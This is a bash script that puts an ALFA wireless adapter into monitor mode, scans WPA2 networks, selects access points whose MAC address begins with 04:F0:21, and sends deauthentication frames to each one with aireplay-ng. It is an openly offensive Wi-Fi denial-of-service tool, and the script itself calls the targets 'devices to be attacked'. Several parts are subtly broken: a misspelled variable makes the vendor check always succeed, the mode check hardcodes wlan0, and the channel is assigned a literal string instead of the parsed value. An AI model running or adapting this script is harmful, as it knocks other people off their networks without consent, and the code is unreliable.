#!/bin/bash




_init() {
  
  echo "Init called"
	
	addr=$(iw $interface info | grep addr | awk '{print $2}')
	if [ ${add:0:8}=="00:c0:ca" ]; then
		echo "Given Interface has a ALFA device, we can proced"
	else
		echo "Given Interface is not a ALFA device, check your connection"
		exit 1
	fi
	
	_init_result
	
	if [ "$result" -eq "1" ]; then
	
		echo "Device already in monitor mode"
	
	else
		airmon-ng check kill
		airmon-ng start $interface
	fi
	
	_init_result
	
	if [ "$result" -eq "1" ]; then
		echo "Device sucessfully in monitor mode"
	else
		echo "Unable to put in monitor mode, Disconnect and reconnect your device"
		exit 1
	fi
		
}

_init_result() {

mode=$(iwconfig wlan0 | grep Mode | awk '{print $1}' | cut -d ":" -f2-)

if [ $mode == "Monitor" ]; then
	result=1
else
	result=0
fi


}

_deinit() {

airmon-ng stop $interface

}







_test(){

channel=0

bssid_list=()

airodump=$(airodump-ng "$interface" -b a| grep WPA2 | head -n 10)

while IFS= read -r line; do  

	words=( $line )
	mac=${words[0]}
	ch=${words[5]}
	
	[[ ${bssid_list[@]} =~ (^|[[:space:]])"$mac"($|[[:space:]]) ]] && result=1 || result=0 
	
	
	if   [ "${mac:0:8}" == "04:F0:21" ] && [ "$result" == 0 ]
		then
		
		bssid_list+=( "$mac" )
		channel=ch
		
	fi



done <<< "$airodump"

echo "List of the devices to be attacked"
echo "${bssid_list[@]}"



echo "Launching airodump-ng on another terminal to set the channel"
echo $channel
xterm -e airodump-ng --channel "$channel" $interface & 

for value in ${bssid_list[@]};
do	
    echo "Attacking device " $value " now "
    aireplay-ng -0 10 -a $value $interface 

done



}

main(){

interface=$1
echo $interface
_init

_test
}

main "$@"
